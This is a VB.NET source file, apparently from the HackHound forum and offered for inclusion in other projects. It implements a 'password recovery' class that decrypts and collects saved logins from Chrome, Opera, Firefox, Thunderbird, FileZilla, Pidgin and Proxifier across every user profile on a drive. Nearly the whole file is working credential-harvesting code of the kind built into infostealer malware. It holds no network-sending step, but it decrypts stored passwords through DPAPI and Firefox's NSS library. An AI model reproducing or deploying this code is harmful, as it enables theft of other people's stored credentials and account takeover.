'           `':,;+####;`           
'         #################        
'          ###########@#;+##'      
'          #@##########'####;      
'         :###@#++######'''++';#,  
'         ######+;;##;;;;;+';;;+#  
'        #####++####'';;;+';'''#'  
'       @######++#+++#+####++''#   
'       ######+#;'''++#+#;;+.      
'      ########;+;'+'++#           
'   .##########'+'''++++           
'  ##############+'+'++#           
'##################+####           
'#########@#########+@##           
'###########@##########@           
'############@##########,          
'
'Rottweiler @ HackHound.org
'
'Usage:
'       Dim AC As New PREC(DriveInfo.GetDrives().FirstOrDefault())
'       AC.RecoverOpera()
'       AC.RecoverFirefox()
'       AC.RecoverChrome()
'       AC.RecoverFileZilla()
'       AC.RecoverPidgin()
'       AC.RecoverThunderbird()
'       AC.RecoverProxifier()
'       For Each Account As PREC.Account In AC.Accounts
'           Console.WriteLine(Account.ToString())
'       Next
'
'Written for HackHound.org - Include in your projects, but please save credits
'So many people to thank for some parts, mostly people from HackHound. So I'll thank the community as a whole instead!

Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Xml

Class PREC
#Region "Win32/API+Other libs"
#Region "Shared"
    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
    End Function
    <Flags()> _
    Private Enum CryptProtectPromptFlags
        CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
        CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
    End Enum
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Private Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As CryptProtectPromptFlags
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure
    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> _
    Private Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure
    Private Function Decrypt(ByVal Datas() As Byte) As String
        On Error Resume Next
        Dim inj, Ors As New DATA_BLOB
        Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
        inj.pbData = Ghandle.AddrOfPinnedObject()
        inj.cbData = Datas.Length
        Ghandle.Free()
        CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
        Dim Returned() As Byte = New Byte(Ors.cbData) {}
        Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
        Dim TheString As String = Encoding.UTF8.GetString(Returned)
        Return TheString.Substring(0, TheString.Length - 1)
    End Function
#End Region
#Region "Firefox"
    Private NSS3 As IntPtr
    Private hModuleList As New List(Of IntPtr)

    <StructLayout(LayoutKind.Sequential)> _
    Private Structure TSECItem
        Public SECItemType As Integer
        Public SECItemData As Integer
        Public SECItemLen As Integer
    End Structure

    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate(ByVal configdir As String) As Long
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate2() As Long
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate3(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate4(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate5(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
    <UnmanagedFunctionPointer(CallingConvention.Cdecl)> _
    Private Delegate Function DLLFunctionDelegate6() As Long

    Private Function PK11_GetInternalKeySlot() As Long
        Return CreateAPI(Of DLLFunctionDelegate2)(NSS3, "PK11_GetInternalKeySlot")()
    End Function
    Private Function PK11_Authenticate(ByVal slot As Long, ByVal loadCerts As Boolean, ByVal wincx As Long) As Long
        Return CreateAPI(Of DLLFunctionDelegate3)(NSS3, "PK11_Authenticate")(slot, loadCerts, wincx)
    End Function
    Private Function NSSBase64_DecodeBuffer(ByVal arenaOpt As IntPtr, ByVal outItemOpt As IntPtr, ByVal inStr As StringBuilder, ByVal inLen As Integer) As Integer
        Return CreateAPI(Of DLLFunctionDelegate4)(NSS3, "NSSBase64_DecodeBuffer")(arenaOpt, outItemOpt, inStr, inLen)
    End Function
    Private Function PK11SDR_Decrypt(ByRef data As TSECItem, ByRef result As TSECItem, ByVal cx As Integer) As Integer
        Return CreateAPI(Of DLLFunctionDelegate5)(NSS3, "PK11SDR_Decrypt")(data, result, cx)
    End Function
    Private Function NSS_Shutdown() As Long
        Return CreateAPI(Of DLLFunctionDelegate6)(NSS3, "NSS_Shutdown")()
    End Function

    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
    Private Shared Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
    End Function

    <DllImport("kernel32.dll", SetLastError:=True, EntryPoint:="FreeLibrary")> _
    Private Shared Function FreeLibrary(ByVal hModule As IntPtr) As Boolean
    End Function

    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Ansi, ExactSpelling:=True)> _
    Private Shared Function GetProcAddress(ByVal hModule As IntPtr, ByVal procName As String) As IntPtr
    End Function

    'Private Function CreateAPI(Of T)(ByVal name As String, ByVal method As String) As T
    '    Return CreateAPI(Of T)(LoadLibrary(name), method)
    'End Function

    Private Function CreateAPI(Of T)(ByVal hModule As IntPtr, ByVal method As String) As T 'Simple overload to avoid loading the same library every time
        On Error Resume Next
        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, method), GetType(T)), Object), T)
    End Function
#End Region
#End Region

#Region "Recovery methods"
#Region "Opera"
    Public Function RecoverOpera() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                If Not File.Exists(AppData & "\Roaming\Opera Software\Opera Stable\Login Data") Then Continue For
                Dim sql As New SQLiteHandler(AppData & "\Roaming\Opera Software\Opera Stable\Login Data")
                sql.ReadTable("logins")
                For i As Integer = 0 To sql.GetRowCount() - 1
                    Dim url As String = sql.GetValue(i, "origin_url")
                    Dim username As String = sql.GetValue(i, "username_value")
                    Dim password_crypted As String = sql.GetValue(i, "password_value")
                    Dim password As String = IIf(String.IsNullOrEmpty(password_crypted), "", Decrypt(Encoding.Default.GetBytes(password_crypted)))
                    Dim Opera As New Account(AccountType.Opera, username, password, url)
                    Accounts.Add(Opera)
                Next
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "Google Chrome"
    Public Function RecoverChrome() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                If Not File.Exists(AppData & "\Local\Google\Chrome\User Data\Default\Login Data") Then Continue For
                Dim sql As New SQLiteHandler(AppData & "\Local\Google\Chrome\User Data\Default\Login Data")
                sql.ReadTable("logins")
                For i As Integer = 0 To sql.GetRowCount() - 1
                    Dim url As String = sql.GetValue(i, "origin_url")
                    Dim username As String = sql.GetValue(i, "username_value")
                    Dim password_crypted As String = sql.GetValue(i, "password_value")
                    Dim password As String = IIf(String.IsNullOrEmpty(password_crypted), "", Decrypt(Encoding.Default.GetBytes(password_crypted)))
                    Dim Chrome As New Account(AccountType.Chrome, username, password, url)
                    Accounts.Add(Chrome)
                Next
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "Mozilla Firefox"
    Private Function FindFirefoxInstallationPath() As String
        Dim MozPath As String = String.Empty
        For Each InstalledAppsDir As String In GetInstalledAppsDirs()
            For Each Dir As String In Directory.GetDirectories(InstalledAppsDir, "Mozilla Firefox", SearchOption.TopDirectoryOnly)
                MozPath = Dir
                If Not String.IsNullOrEmpty(MozPath) Then
                    Exit For
                End If
            Next
        Next
        Return MozPath
    End Function

    Private Function FindFirefoxProfilePath(ByVal AppDataDir As String) As String
        Dim mozAPPDATA As String = AppDataDir & "\Roaming\Mozilla\Firefox"
        If Not IO.Directory.Exists(mozAPPDATA) Then Return String.Empty : Exit Function
        Dim mozProfile = New Regex("^Path=(.*?)$", RegexOptions.Multiline).Match(IO.File.ReadAllText(mozAPPDATA & "\profiles.ini")).Groups(1).Value.Replace(vbCr, Nothing)
        Return mozAPPDATA & "\" & mozProfile
    End Function

    Private Function NSS_Init(ByVal configdir As String) As Long
		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcr100.dll"))
		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcp100.dll"))
		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcr120.dll"))
		hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\msvcp120.dll"))
        hModuleList.Add(LoadLibrary(FindFirefoxInstallationPath() & "\mozglue.dll"))
        NSS3 = LoadLibrary(FindFirefoxInstallationPath() & "\nss3.dll")
        hModuleList.Add(NSS3)
        Return CreateAPI(Of DLLFunctionDelegate)(NSS3, "NSS_Init")(configdir)
    End Function

    Private Function DecryptFF(ByVal str As String)
        On Error Resume Next
        Dim mozSEC, mozSEC2 As TSECItem
        Dim sb As New StringBuilder(str)
        Dim mozDecodeBuffer As Integer = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)
        mozSEC = New TSECItem
        mozSEC2 = Marshal.PtrToStructure(New IntPtr(mozDecodeBuffer), GetType(TSECItem))
        If PK11SDR_Decrypt(mozSEC2, mozSEC, 0) = 0 Then
            If mozSEC.SECItemLen <> 0 Then
                Dim mozDecryptedData = New Byte(mozSEC.SECItemLen - 1) {}
                Marshal.Copy(New IntPtr(mozSEC.SECItemData), mozDecryptedData, 0, mozSEC.SECItemLen)
                Return Encoding.UTF8.GetString(mozDecryptedData)
            End If
        End If
        Return String.Empty
    End Function

    Public Function RecoverFirefox() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                Dim mozProfilePath As String = FindFirefoxProfilePath(AppData)
                If Not IO.Directory.Exists(mozProfilePath) Then Continue For
                Dim mozLogins = IO.File.ReadAllText(mozProfilePath & "\logins.json")
                NSS_Init(mozProfilePath)
                Dim keySlot As Long = PK11_GetInternalKeySlot()
                PK11_Authenticate(keySlot, True, 0)
                Dim JSONRegex As New Regex("\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""")
                Dim mozMC = JSONRegex.Matches(mozLogins)
                For I = 0 To mozMC.Count - 1 Step 3
                    Dim host = mozMC(I).Groups(2).Value
                    Dim usr = mozMC(I + 1).Groups(2).Value
                    Dim pas = mozMC(I + 2).Groups(2).Value
                    Dim Firefox As New Account(AccountType.Firefox, DecryptFF(usr), DecryptFF(pas), host)
                    Accounts.Add(Firefox)
                Next
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            'An unhandled exception of type 'System.NullReferenceException' occurred in x
            'Additional Information: Object reference Not set to an instance of an object.

            'The error above most likely means you are compiling to other than x86 architecture
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "Mozilla Thunderbird"
    Private Function FindThunderbirdProfilePath(ByVal AppDataDir As String) As String
        Dim mozThunderAPPDATA As String = AppDataDir & "\Roaming\Thunderbird"
        If Not IO.Directory.Exists(mozThunderAPPDATA) Then Return String.Empty : Exit Function
        Dim mozProfile = New Regex("Path=(.*?)$", RegexOptions.Multiline).Match(IO.File.ReadAllText(mozThunderAPPDATA & "\profiles.ini")).Groups(1).Value.Replace(vbCr, Nothing)
        Return mozThunderAPPDATA & "\" & mozProfile
    End Function
    Public Function RecoverThunderbird() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                Dim mozThunderProfilePath As String = FindThunderbirdProfilePath(AppData)
                If Not IO.Directory.Exists(mozThunderProfilePath) Then Continue For
                Dim mozLogins = IO.File.ReadAllText(mozThunderProfilePath & "\logins.json")
                NSS_Init(mozThunderProfilePath & "\")
                Dim keySlot As Long = PK11_GetInternalKeySlot()
                PK11_Authenticate(keySlot, True, 0)
                Dim JSONRegex As New Regex("\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""")
                Dim mozMC = JSONRegex.Matches(mozLogins)
                For I = 0 To mozMC.Count - 1 Step 3
                    Dim host = mozMC(I).Groups(2).Value
                    Dim usr = mozMC(I + 1).Groups(2).Value
                    Dim pas = mozMC(I + 2).Groups(2).Value
                    Dim Thunderbird As New Account(AccountType.Thunderbird, DecryptFF(usr), DecryptFF(pas), host)
                    Accounts.Add(Thunderbird)
                Next
                NSS_Shutdown()
                For Each hModule As IntPtr In hModuleList
                    FreeLibrary(hModule)
                Next
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            'An unhandled exception of type 'System.NullReferenceException' occurred in x
            'Additional Information: Object reference Not set to an instance of an object.

            'The error above most likely means you are compiling to other than x86 architecture
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "FileZilla"
    Public Function RecoverFileZilla() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                If IO.File.Exists(AppData & "\Roaming\FileZilla\recentservers.xml") Then
                    Dim x As New XmlDocument
                    x.Load(AppData & "\Roaming\FileZilla\recentservers.xml")
                    For Each Node As XmlNode In x.ChildNodes(1).SelectNodes("RecentServers/Server")
                        Dim host As String = String.Format("{0}:{1}", ExtractValue(Node, "Host"), ExtractValue(Node, "Port"))
                        Dim user As String = ExtractValue(Node, "User")
                        Dim pass As String = ExtractValue(Node, "Pass", (Node.SelectSingleNode("Pass[@encoding='base64']") IsNot Nothing))
                        Dim FileZilla As New Account(AccountType.FileZilla, user, pass, host)
                        Accounts.Add(FileZilla)
                    Next
                    x = Nothing
                Else
                    Continue For
                End If
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "Pidgin"
    Public Function RecoverPidgin() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                If Not IO.File.Exists(AppData & "\Roaming\.purple\accounts.xml") Then Continue For
                Dim Doc As New XmlDocument
                Doc.Load(AppData & "\Roaming\.purple\accounts.xml")
                For Each Node As XmlNode In Doc.ChildNodes(1).SelectNodes("account")
                    Dim Domain As String = ExtractValue(Node, "protocol")
                    Dim Username As String = ExtractValue(Node, "name")
                    Dim Password As String = ExtractValue(Node, "password")
                    Dim Pidgin As New Account(AccountType.Pidgin, Username, Password, Domain)
                    Accounts.Add(Pidgin)
                Next
                Doc = Nothing
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#Region "Proxifier"
    ''' <summary>
    ''' Recovers Proxifier Proxy list (TODO: detect/implement password cryptography algorithm)
    ''' </summary>
    ''' <returns></returns>
    Public Function RecoverProxifier() As Boolean
        Try
            For Each AppData As String In GetAppDataFolders()
                If Not IO.File.Exists(AppData & "\Roaming\Proxifier\Profiles\Default.ppx") Then Continue For
                Dim Doc As New XmlDocument
                Doc.Load(AppData & "\Roaming\Proxifier\Profiles\Default.ppx")
                For Each Node As XmlNode In Doc.ChildNodes(1).SelectSingleNode("ProxyList").SelectNodes("Proxy")
                    Dim IPAddress As String = "[" & Node.Attributes("type").Value & "]" & ExtractValue(Node, "Address") & ":" & ExtractValue(Node, "Port")
                    Dim Username As String = ""
                    Dim Password As String = ""
                    For Each n As XmlNode In Node.ChildNodes
                        If n.Name = "Authentication" Then
                            If n.Attributes("enabled").Value = "true" Then
                                Username = ExtractValue(n, "Username")
                                Password = ExtractValue(n, "Password")
                            End If
                        End If
                    Next
                    Dim Proxifier As New Account(AccountType.Proxifier, Username, Password, IPAddress)
                    Accounts.Add(Proxifier)
                Next
                Doc = Nothing
            Next
            Return True
        Catch e As Exception
#If DEBUG Then
            Throw e
#End If
            Return False
        End Try
    End Function
#End Region
#End Region

#Region "Hacks/Helpers"
    Private Function ExtractValue(ByVal Node As XmlNode, ByVal Key As String, Optional ByVal DecodeBase64 As Boolean = False) As String
        Dim exNode As XmlNode = Node.SelectSingleNode(Key)
        If DecodeBase64 Then
            Return New UTF8Encoding().GetString(Convert.FromBase64String(exNode.InnerText))
        Else
            Return exNode.InnerText
        End If
    End Function
    Private Function isWindowsXP() As Boolean
        Return (System.Environment.OSVersion.Version.Major = 5)
    End Function
    Private Function GetAppDataFolders() As String()
        On Error Resume Next
        Dim iList As New List(Of String)
        If isWindowsXP() Then
            For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName & "Documents and Settings\", "*", SearchOption.TopDirectoryOnly)
                iList.Add(Dir & "Application Data")
            Next
        Else
            For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName & "Users\", "*", SearchOption.TopDirectoryOnly)
                Dim dirInfo As New System.IO.DirectoryInfo(Dir)
                iList.Add(Drive.RootDirectory.FullName & "Users\" & dirInfo.Name & "\AppData")
            Next
        End If
        Return iList.ToArray
    End Function
    Private Function GetInstalledAppsDirs() As String()
        Dim Apps As String = String.Empty
        Dim iList As New List(Of String)
        For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName, "Program Files*", SearchOption.TopDirectoryOnly)
            iList.Add(Dir)
        Next
        Return iList.ToArray
    End Function

#End Region

#Region "Detectors"
    'Not sure how I will do this without access to registry on other drives yet!!
    'So currently I check if login file exists inside the recovery functions
#End Region

#Region "Main code stuff"
    Sub New(ByVal Drive As DriveInfo)
        Me.Drive = Drive
    End Sub
    Sub New()
        For Each Drive As DriveInfo In DriveInfo.GetDrives
            If Drive.RootDirectory.FullName = Path.GetPathRoot(Environment.SystemDirectory) Then
                Me.Drive = Drive : Exit For
            End If
        Next
    End Sub
    Private _drive As DriveInfo
    Public Property Drive() As DriveInfo
        Get
            Return _drive
        End Get
        Set(ByVal value As DriveInfo)
            _drive = value
        End Set
    End Property
    Private _accounts As New List(Of Account)
    Public Property Accounts() As List(Of Account)
        Get
            Return _accounts
        End Get
        Set(ByVal value As List(Of Account))
            _accounts = value
        End Set
    End Property

#End Region
End Class

Class Account
    Private _username As String
    Public Property Username() As String
        Get
            Return _username
        End Get
        Set(ByVal value As String)
            _username = value
        End Set
    End Property
    Private _password As String
    Public Property Password() As String
        Get
            Return _password
        End Get
        Set(ByVal value As String)
            _password = value
        End Set
    End Property
    Private _domain As String
    Public Property Domain() As String
        Get
            Return _domain
        End Get
        Set(ByVal value As String)
            _domain = value
        End Set
    End Property
    Private _type As AccountType
    Public Property Type() As AccountType
        Get
            Return _type
        End Get
        Set(ByVal value As AccountType)
            _type = value
        End Set
    End Property
    Sub New(ByVal Type As AccountType, ByVal Username As String, ByVal Password As String)
        Me.Type = Type
        Me.Username = Username
        Me.Password = Password
    End Sub
    Sub New(ByVal Type As AccountType, ByVal Username As String, ByVal Password As String, ByVal Domain As String)
        Me.Type = Type
        Me.Username = Username
        Me.Password = Password
        Me.Domain = Domain
    End Sub
    Sub New(ByVal Type As AccountType)
        Me.Type = Type
    End Sub
    Public Overrides Function ToString() As String
        Dim sb As New StringBuilder()
        sb.AppendLine("PREC.Account {")
        sb.AppendLine("Type:        " & Type.ToString)
        sb.AppendLine("Domain:      " & Domain)
        sb.AppendLine("Username:    " & Username)
        sb.AppendLine("Password:    " & Password)
        sb.AppendLine("}")
        Return sb.ToString
    End Function
End Class

Enum AccountType
    Firefox
    Chrome
    Opera
    FileZilla
    Pidgin
    Thunderbird
    Proxifier
End Enum
